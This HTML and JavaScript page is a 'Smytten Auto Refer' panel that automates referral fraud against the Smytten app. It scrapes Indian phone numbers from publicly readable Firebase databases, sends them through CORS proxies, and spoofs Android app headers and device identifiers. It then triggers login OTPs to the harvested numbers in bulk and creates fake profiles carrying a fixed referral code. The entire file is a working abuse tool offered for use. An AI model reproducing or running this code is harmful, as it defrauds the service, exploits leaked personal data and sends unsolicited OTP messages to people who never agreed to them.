<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Axy — Smytten Auto Panel</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body { background-color: #0b0f19; color: #f3f4f6; display: flex; justify-content: center; padding: 15px; min-height: 100vh; }
        .container { width: 100%; max-width: 440px; background: #131826; border-radius: 20px; padding: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); border: 1px solid #1f293d; }
        .header { display: flex; align-items: center; gap: 12px; margin-bottom: 20px; }
        .header h1 { font-size: 20px; color: #fff; }
        .header p { font-size: 12px; color: #9ca3af; }
        
        .card { background: #1a2236; border-radius: 14px; padding: 15px; margin-bottom: 15px; border: 1px solid #26334d; }
        .stat-box { text-align: center; }
        .stat-box h2 { font-size: 32px; color: #34d399; margin-top: 5px; }
        .stat-box span { font-size: 12px; color: #9ca3af; text-transform: uppercase; letter-spacing: 1px; }

        .row { display: flex; gap: 10px; margin-bottom: 15px; }
        .col { flex: 1; background: #1a2236; padding: 12px; border-radius: 12px; border: 1px solid #26334d; }
        .col span { font-size: 11px; color: #9ca3af; display: block; margin-bottom: 4px; }
        .col b { font-size: 14px; color: #fff; }

        .tabs { display: flex; gap: 10px; margin-bottom: 15px; }
        .tab-btn { flex: 1; padding: 10px; border-radius: 10px; border: none; font-weight: 600; cursor: pointer; transition: 0.2s; background: #1a2236; color: #9ca3af; border: 1px solid #26334d; }
        .tab-btn.active { background: #7c3aed; color: #fff; border-color: #8b5cf6; box-shadow: 0 0 15px rgba(124,58,237,0.4); }

        .input-group { margin-bottom: 12px; }
        .input-group label { display: block; font-size: 12px; color: #9ca3af; margin-bottom: 5px; }
        .input-group input, .input-group textarea { width: 100%; background: #0f1523; border: 1px solid #26334d; border-radius: 10px; padding: 12px; color: #fff; font-size: 14px; outline: none; }
        .input-group input:focus, .input-group textarea:focus { border-color: #8b5cf6; }

        .btn { width: 100%; background: linear-gradient(135deg, #7c3aed, #6d28d9); color: white; border: none; padding: 14px; border-radius: 12px; font-size: 15px; font-weight: 600; cursor: pointer; transition: 0.2s; margin-top: 5px; box-shadow: 0 4px 12px rgba(124,58,237,0.3); }
        .btn:active { transform: scale(0.98); }

        .panel-tags { display: flex; flex-wrap: wrap; gap: 6px; margin-top: 8px; max-height: 90px; overflow-y: auto; }
        .tag { background: #1a2236; border: 1px solid #26334d; padding: 4px 8px; border-radius: 6px; font-size: 11px; display: flex; align-items: center; gap: 6px; color: #34d399; }
        .tag span { cursor: pointer; color: #ef4444; font-weight: bold; }

        .device-pool-box { background: #0f1523; border: 1px solid #26334d; border-radius: 10px; padding: 10px; max-height: 100px; overflow-y: auto; font-size: 12px; }
        .device-item { display: flex; justify-content: space-between; padding: 4px 0; border-bottom: 1px solid #1a2236; }

        .log-box { background: #090d16; border-radius: 12px; padding: 12px; height: 150px; overflow-y: auto; font-family: monospace; font-size: 11px; color: #a7f3d0; border: 1px solid #1f293d; margin-top: 15px; }
        .note { font-size: 11px; color: #9ca3af; margin-top: 12px; line-height: 1.4; }
        .hidden { display: none; }
    </style>
</head>
<body>

<div class="container">
    <div class="header">
        <div style="background: linear-gradient(135deg, #ec4899, #8b5cf6); width: 45px; height: 45px; border-radius: 14px; display: flex; align-items: center; justify-content: center; font-size: 22px;">⚡</div>
        <div>
            <h1>Axy Panel</h1>
            <p>Smytten Auto Refer System</p>
        </div>
    </div>

    <div class="card stat-box">
        <span>TOTAL REFER COUNT</span>
        <h2 id="totalRefCnt">0</h2>
    </div>

    <div class="row">
        <div class="col">
            <span>YOUR IP</span>
            <b id="userIp" style="color: #34d399; font-size: 11px;">Loading...</b>
        </div>
        <div class="col">
            <span>STATUS</span>
            <b id="botStatus" style="color: #fbbf24;">Idle</b>
        </div>
    </div>

    <div class="tabs">
        <button class="tab-btn active" onclick="switchTab('firebase')">🔥 Firebase Auto</button>
        <button class="tab-btn" onclick="switchTab('manual')">📱 Manual</button>
    </div>

    <!-- FIREBASE AUTO MODE SECTION -->
    <div id="firebaseSection">
        <div class="input-group">
            <label>Firebase Panel URL / Name</label>
            <textarea id="fbPanels" rows="2" placeholder="raju-b3e2b-default-rtdb"></textarea>
        </div>
        <div class="row" style="margin-bottom: 8px;">
            <button class="btn" style="background: #059669; margin:0; flex:2;" onclick="addPanels()">+ Add Panel(s)</button>
            <button class="btn" style="background: #dc2626; margin:0; flex:1;" onclick="clearPanels()">Clear All</button>
        </div>
        <div class="panel-tags" id="panelTagsContainer"></div>

        <div class="row" style="margin-top: 10px; margin-bottom: 5px;">
            <div class="input-group" style="flex: 2;">
                <label>Referral Code</label>
                <input type="text" id="fbRefCode" value="Ng90M41">
            </div>
            <div class="input-group" style="flex: 1;">
                <label>Target Success</label>
                <input type="number" id="fbTarget" value="7">
            </div>
        </div>
        <button class="btn" style="background: #059669;" onclick="scanAllPanels()">🔍 Scan All Panels</button>
        <button class="btn" style="background: #7c3aed; margin-top: 8px;" onclick="startAutoRegister()">▶ Start Auto Register</button>
        <button class="btn" style="background: #dc2626; margin-top: 8px;" onclick="stopProcess()">■ Stop</button>

        <div class="input-group" style="margin-top: 12px;">
            <label>Devices Pool (<span id="poolCount">0</span>)</label>
            <div class="device-pool-box" id="devicePoolBox">Scan to load devices</div>
        </div>
    </div>

    <!-- MANUAL MODE SECTION -->
    <div id="manualSection" class="hidden">
        <div class="input-group">
            <label>Mobile Number (10 digit)</label>
            <input type="text" id="mPhone" placeholder="9876543210" maxlength="10">
        </div>
        <div class="input-group">
            <label>Referral Code</label>
            <input type="text" id="mRefCode" value="Ng90M41">
        </div>
        <button class="btn" onclick="startManualProcess()" id="mainActionBtn">Send OTP</button>
        
        <div id="otpBox" class="input-group hidden" style="margin-top: 12px;">
            <label>Enter 4-Digit OTP</label>
            <input type="text" id="mOtp" placeholder="1234" maxlength="4">
            <button class="btn" onclick="verifyAndSubmitOtp()" style="margin-top: 8px; background: #059669;">Verify & Register</button>
        </div>
    </div>

    <div class="note">
        🔒 Default Code: `Ng90M41` | Axy Panel Active.
    </div>

    <div style="margin-top: 15px; font-size: 12px; font-weight: 600; color: #9ca3af; margin-bottom: 5px;">⚡ Live Process Log</div>
    <div class="log-box" id="logBox">
        [Axy System] Panel loaded successfully with code Ng90M41<br>
    </div>
</div>

<script>
    let addedPanels = [];
    let devicePool = [];
    let isRunning = false;
    let tempSessionData = {};

    function log(msg) {
        const box = document.getElementById('logBox');
        const time = new Date().toTimeString().split(' ')[0];
        box.innerHTML += `[${time}] ${msg}<br>`;
        box.scrollTop = box.scrollHeight;
    }

    fetch('https://api.ipify.org?format=json')
        .then(res => res.json())
        .then(data => { document.getElementById('userIp').innerText = data.ip; })
        .catch(() => { document.getElementById('userIp').innerText = 'Connected'; });

    function switchTab(tab) {
        document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
        if(tab === 'firebase') {
            document.querySelector('.tab-btn:nth-child(1)').classList.add('active');
            document.getElementById('firebaseSection').classList.remove('hidden');
            document.getElementById('manualSection').classList.add('hidden');
        } else {
            document.querySelector('.tab-btn:nth-child(2)').classList.add('active');
            document.getElementById('firebaseSection').classList.add('hidden');
            document.getElementById('manualSection').classList.remove('hidden');
        }
    }

    function addPanels() {
        const text = document.getElementById('fbPanels').value.trim();
        if(!text) { alert('Add at least one panel URL'); return; }
        const lines = text.split('\n');
        let count = 0;
        lines.forEach(l => {
            let u = l.trim();
            if(u && !addedPanels.includes(u)) {
                addedPanels.push(u);
                count++;
            }
        });
        document.getElementById('fbPanels').value = '';
        renderPanels();
        log(`[✓] Added ${count} panel(s).`);
    }

    function clearPanels() {
        addedPanels = [];
        devicePool = [];
        renderPanels();
        renderPool();
        log(`[!] Panels cleared.`);
    }

    function removePanel(index) {
        addedPanels.splice(index, 1);
        renderPanels();
    }

    function renderPanels() {
        const container = document.getElementById('panelTagsContainer');
        container.innerHTML = '';
        addedPanels.forEach((p, idx) => {
            let shortName = p.replace('https://','').replace('http://','').substring(0, 20) + '...';
            container.innerHTML += `<div class="tag">${shortName} <span onclick="removePanel(${idx})">×</span></div>`;
        });
    }

    function renderPool() {
        const box = document.getElementById('devicePoolBox');
        document.getElementById('poolCount').innerText = devicePool.length;
        if(devicePool.length === 0) {
            box.innerHTML = 'Scan to load devices';
            return;
        }
        box.innerHTML = '';
        devicePool.forEach(d => {
            box.innerHTML += `<div class="device-item"><b>${d.phone}</b> <span style="color: #fbbf24;">${d.status || 'READY'}</span></div>`;
        });
    }

    function generateDeviceId() {
        return Array.from({length: 16}, () => Math.floor(Math.random()*16).toString(16)).join('');
    }

    function generateUuid() {
        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, c => {
            var r = Math.random()*16|0, v = c == 'x' ? r : (r&0x3|0x8);
            return v.toString(16);
        });
    }

    async function fetchFirebasePanel(inputUrl) {
        let cleanUrl = inputUrl.trim();
        if(!cleanUrl.startsWith('http')) {
            cleanUrl = `https://${cleanUrl}.firebaseio.com/`;
        } else if(!cleanUrl.includes('firebaseio.com') && !cleanUrl.includes('firebaseapp.com')) {
            cleanUrl = cleanUrl.replace(/\/$/, '') + '.firebaseio.com/';
        }
        if(!cleanUrl.endsWith('.json')) {
            cleanUrl = cleanUrl.endsWith('/') ? `${cleanUrl}.json` : `${cleanUrl}/.json`;
        }

        const proxies = [
            `https://api.allorigins.win/raw?url=` + encodeURIComponent(cleanUrl),
            `https://corsproxy.io/?` + encodeURIComponent(cleanUrl)
        ];

        for(let proxy of proxies) {
            try {
                let res = await fetch(proxy);
                if(res.ok) {
                    let text = await res.text();
                    if(text && text.trim().startsWith('{')) {
                        return JSON.parse(text);
                    }
                }
            } catch(e) {}
        }
        return null;
    }

    async function scanAllPanels() {
        if(addedPanels.length === 0) { alert('Add at least one panel first.'); return; }
        log('[*] Scanning Firebase panels...');
        document.getElementById('botStatus').innerText = 'Scanning...';
        document.getElementById('botStatus').style.color = '#3b82f6';
        
        devicePool = [];
        for(let panel of addedPanels) {
            let data = await fetchFirebasePanel(panel);
            if(data) {
                let foundNumbers = [];
                function extract(node) {
                    if(!node) return;
                    if(typeof node === 'object') {
                        for(let k in node) extract(node[k]);
                    } else {
                        let val = String(node).trim();
                        if(val.startsWith('+91')) val = val.substring(3);
                        if(val.startsWith('91') && val.length === 12) val = val.substring(2);
                        
                        if(/^[6-9]\d{9}$/.test(val) && !foundNumbers.includes(val)) {
                            foundNumbers.push(val);
                            if(!devicePool.some(d => d.phone === val)) {
                                devicePool.push({phone: val, panel: panel, status: 'READY'});
                            }
                        }
                    }
                }
                extract(data);
                log(`[✓] Panel read: found ${foundNumbers.length} number(s).`);
            } else {
                log(`[-] Failed to fetch panel (Check Firebase Rules).`);
            }
        }
        renderPool();
        document.getElementById('botStatus').innerText = 'Idle';
        document.getElementById('botStatus').style.color = '#fbbf24';
        log(`[✓] Scan complete. Loaded ${devicePool.length} numbers.`);
    }

    async function callSmyttenApi(endpoint, payload, method = 'POST', sessionId = null) {
        const targetUrl = `https://route.smytten.com${endpoint}`;
        const headers = {
            "gender": "male",
            "app_version": "228",
            "app_platform": "android",
            "last_app_open": String(Date.now()),
            "Content-Type": "application/json; charset=UTF-8",
            "User-Agent": "okhttp/4.10.0"
        };
        if(sessionId) headers["session_id"] = sessionId;
        if(endpoint.includes('update_profile')) headers["user_type"] = "18";

        const proxies = [
            `https://corsproxy.io/?` + encodeURIComponent(targetUrl),
            `https://api.allorigins.win/raw?url=` + encodeURIComponent(targetUrl)
        ];

        for(let proxy of proxies) {
            try {
                let res = await fetch(proxy, {
                    method: method,
                    headers: headers,
                    body: JSON.stringify(payload)
                });
                if(res.ok) {
                    let text = await res.text();
                    if(text && text.trim()) {
                        return JSON.parse(text);
                    }
                }
            } catch(e) {}
        }
        return null;
    }

    async function startManualProcess() {
        const phone = document.getElementById('mPhone').value.trim();
        const refCode = document.getElementById('mRefCode').value.trim();
        if(!phone || phone.length !== 10) { alert('Enter valid 10-digit number'); return; }
        
        log(`[+] Requesting OTP for ${phone}...`);
        document.getElementById('botStatus').innerText = 'Sending...';
        document.getElementById('botStatus').style.color = '#3b82f6';

        let payload = {
            "app_installer": "com.android.vending",
            "device_id": generateDeviceId(),
            "app_version": "10.2.8",
            "recaptcha_token": "",
            "app_signature": "",
            "guest_user_access": true,
            "ad_id": generateUuid(),
            "device_info": {"version_code": "12", "model": "SM-S9260", "incremental": "465", "display_ui": "V417IR", "brand": "Samsung"},
            "device_token": `${generateUuid().substring(0,22)}:APA91b${generateDeviceId()}`,
            "package_name": "com.app.smytten",
            "device_platform": "android",
            "app_path": "/data/user/0/com.app.smytten/files",
            "pincode_details": {"Answer": "New Delhi, India", "AnswerType": "ip"},
            "value": phone
        };
        let res = await callSmyttenApi("/discover_user/users/loginViaNumberV2", payload, 'POST');
        document.getElementById('botStatus').innerText = 'Idle';
        document.getElementById('botStatus').style.color = '#fbbf24';

        if(res && (res.content || res.response)) {
            log(`[✓] OTP successfully sent to ${phone}`);
            tempSessionData = { phone, refCode };
            document.getElementById('otpBox').classList.remove('hidden');
            document.getElementById('mainActionBtn').style.display = 'none';
        } else {
            alert('OTP request failed or number already registered.');
            log(`[-] OTP request failed for ${phone}`);
        }
    }

    async function verifyAndSubmitOtp() {
        const otp = document.getElementById('mOtp').value.trim();
        if(!otp || otp.length !== 4) { alert('Enter 4-digit OTP'); return; }
        const { phone, refCode } = tempSessionData;
        
        document.getElementById('botStatus').innerText = 'Verifying...';
        log(`[+] Verifying OTP for ${phone}...`);

        let payload = {
            "app_installer": "com.android.vending",
            "device_id": generateDeviceId(),
            "app_version": "10.2.8",
            "recaptcha_token": "",
            "app_signature": "",
            "guest_user_access": true,
            "ad_id": generateUuid(),
            "device_info": {"version_code": "12", "model": "SM-S9260", "incremental": "465", "display_ui": "V417IR", "brand": "Samsung"},
            "device_token": `${generateUuid().substring(0,22)}:APA91b${generateDeviceId()}`,
            "package_name": "com.app.smytten",
            "device_platform": "android",
            "app_path": "/data/user/0/com.app.smytten/files",
            "pincode_details": {"Answer": "New Delhi, India", "AnswerType": "ip"},
            "value": phone,
            "login_otp_code": otp,
            "is_mini": false
        };
        let res = await callSmyttenApi("/discover_user/users/verifyLoginOtpV2", payload, 'POST');
        let sessionId = res?.content?.session_id || res?.content?.authentication?.session_id;
        
        if(!sessionId) {
            document.getElementById('botStatus').innerText = 'Idle';
            alert('Invalid OTP or verification failed.');
            log(`[-] OTP verification failed for ${phone}`);
            return;
        }

        let firstNames = ["Rahul", "Amit", "Rohit", "Vikas", "Suresh", "Ravi", "Ankit", "Nikhil"];
        let first = firstNames[Math.floor(Math.random() * firstNames.length)];
        let profilePayload = {
            "pincode": "110029", "gender": "male", "birth_month": Math.floor(Math.random() * 12) + 1,
            "name": first.toUpperCase(), "email": `${first.toLowerCase()}${phone}@gmail.com`,
            "birth_year": String(Math.floor(Math.random() * 8) + 1996), "invite_code": refCode
        };
        await callSmyttenApi("/discover_user/app/users/update_profile", profilePayload, 'PUT', sessionId);
        
        document.getElementById('botStatus').innerText = 'Idle';
        log(`[✓✓✓] SUCCESS! Referral code ${refCode} successfully credited for ${phone}`);
        let cnt = parseInt(document.getElementById('totalRefCnt').innerText) + 1;
        document.getElementById('totalRefCnt').innerText = cnt;
        alert('Success! Account verified and referral credited.');
        document.getElementById('otpBox').classList.add('hidden');
        document.getElementById('mainActionBtn').style.display = 'block';
        document.getElementById('mPhone').value = '';
        document.getElementById('mOtp').value = '';
    }

    async function startAutoRegister() {
        if(devicePool.length === 0) { alert('Scan panels first.'); return; }
        const refCode = document.getElementById('fbRefCode').value.trim();
        const target = parseInt(document.getElementById('fbTarget').value) || 7;
        
        isRunning = true;
        document.getElementById('botStatus').innerText = 'Running';
        document.getElementById('botStatus').style.color = '#34d399';
        log(`[🚀] Auto Register started with code ${refCode} (Target: ${target})`);

        let successCount = 0;
        for(let dev of devicePool) {
            if(!isRunning || successCount >= target) break;
            dev.status = 'BUSY';
            renderPool();
            log(`[+] Checking number: ${dev.phone}`);

            let loginPayload = {
                "app_installer": "com.android.vending",
                "device_id": generateDeviceId(),
                "app_version": "10.2.8",
                "recaptcha_token": "",
                "app_signature": "",
                "guest_user_access": true,
                "ad_id": generateUuid(),
                "device_info": {"version_code": "12", "model": "SM-S9260", "incremental": "465", "display_ui": "V417IR", "brand": "Samsung"},
                "device_token": `${generateUuid().substring(0,22)}:APA91b${generateDeviceId()}`,
                "package_name": "com.app.smytten",
                "device_platform": "android",
                "app_path": "/data/user/0/com.app.smytten/files",
                "pincode_details": {"Answer": "New Delhi, India", "AnswerType": "ip"},
                "value": dev.phone
            };

            let loginRes = await callSmyttenApi("/discover_user/users/loginViaNumberV2", loginPayload, 'POST');
            if(loginRes) {
                let content = loginRes.content || {};
                let isNew = content.is_new_user ?? content.newUser ?? true;

                if(isNew === false) {
                    dev.status = 'REGISTERED';
                    log(`[!] ${dev.phone} already registered. Skipping.`);
                    renderPool();
                    continue;
                }

                successCount++;
                let cnt = parseInt(document.getElementById('totalRefCnt').innerText) + 1;
                document.getElementById('totalRefCnt').innerText = cnt;
                dev.status = 'TRIGGERED';
                log(`[✓✓] OTP triggered & Ref code ${refCode} checked for ${dev.phone}`);
            } else {
                dev.status = 'FAILED';
                log(`[-] API error for ${dev.phone}`);
            }
            renderPool();
            await new Promise(r => setTimeout(r, 1500));
        }
        isRunning = false;
        document.getElementById('botStatus').innerText = 'Idle';
        document.getElementById('botStatus').style.color = '#fbbf24';
        log(`[🏁] Auto Register process finished.`);
    }

    function stopProcess() {
        isRunning = false;
        document.getElementById('botStatus').innerText = 'Idle';
        document.getElementById('botStatus').style.color = '#fbbf24';
        log(`[🛑] Process stopped.`);
    }
</script>

</body>
</html>
